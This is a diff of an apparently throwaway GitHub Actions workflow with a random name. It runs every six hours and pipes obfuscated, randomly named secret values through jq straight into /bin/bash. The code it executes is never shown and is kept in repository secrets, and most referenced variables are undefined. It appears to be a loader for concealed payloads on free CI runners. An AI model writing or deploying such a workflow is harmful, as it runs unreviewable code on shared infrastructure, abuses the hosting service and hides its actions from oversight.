@@ -1,33 +1,22 @@
 name: olympicszealous
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 0/6 * * *'
-
+    - cron: '19 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: olympicszealous
         env:
-          eets414: ${{ secrets.eets414 }}
+          duh66593: ${{ secrets.duh66593 }}
         run: |
-          echo $eets414 | jq -r .cr8 | /bin/bash
-          echo $nbs96254 | jq -r .j301 | /bin/bash
-          echo $lj52 | jq -r .bofzj506 | /bin/bash
-          echo $w78 | jq -r .z92 | /bin/bash
-          echo $xevx3417 | jq -r .lr30137 | /bin/bash
-          echo $e97 | jq -r .jtjfw71260 | /bin/bash
-          echo $ecqd92168 | jq -r .kpsma5349 | /bin/bash
-          echo $l129 | jq -r .rnwpr69 | /bin/bash
-          echo $oyj3 | jq -r .xsp7 | /bin/bash
-          echo $u0355 | jq -r .hyg2 | /bin/bash
-          echo $ur8 | jq -r .xsmkx135 | /bin/bash
-          echo $zem29 | jq -r .en71262 | /bin/bash
-          echo $datoc932 | jq -r .uiekh02 | /bin/bash
-          echo $dolw583 | jq -r .zfqr102 | /bin/bash
-          echo $xsk7396 | jq -r .xituf44 | /bin/bash
-          echo $ure45183 | jq -r .yvtce59492 | /bin/bash
+          echo $duh66593 | jq -r .kah13 | /bin/bash
+          echo $qyq0147 | jq -r .madeo73 | /bin/bash
+          echo $zo59 | jq -r .boau958 | /bin/bash
+          echo $tws75 | jq -r .awjo1 | /bin/bash
+          echo $oucq2 | jq -r .fqqo2 | /bin/bash
+          echo $hvybq2 | jq -r .bvj217 | /bin/bash
 
